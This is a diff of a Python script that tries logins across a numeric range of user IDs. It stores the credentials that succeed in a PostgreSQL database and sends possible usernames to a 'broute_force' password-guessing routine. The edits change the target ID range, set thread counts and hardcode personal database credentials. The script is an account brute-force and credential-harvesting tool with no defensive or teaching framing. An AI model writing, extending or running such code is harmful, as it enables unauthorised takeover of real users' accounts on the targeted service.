@@ -7,9 +7,9 @@ import psycopg2
 # https://www.digitalocean.com/community/tutorials/how-to-install-and-use-postgresql-on-ubuntu-20-04
 
 db = psycopg2.connect(
-    user = "postgres",
-    password = "postgres",
-    database = "postgres",
+    user = "iftakhar",
+    password = "iftakhar123",
+    database = "iftakhar",
     host = 'localhost',
     port = 5432
 )
@@ -23,8 +23,7 @@ def login(user_id, password, cursor=cursor):
     if req.is_logged_in():
         cursor.execute(insert_query, (user_id, password, "true", req.get_user_name()))
         print(f'Success {user_id}')
-    
-    if req.is_username_possible():
+    elif req.is_username_possible() and not req.is_logged_in():
         print(f'Broteforse {user_id}')
         broute_force(user_id, set(password))
     else:
@@ -76,7 +75,7 @@ def main(start: int, end: int, max_threads=300):
     db.commit()
     db.close()
 
-main(10000, 12000)
+main(14400, 18200, 150)
 
 '''
 HZ15000 AS10
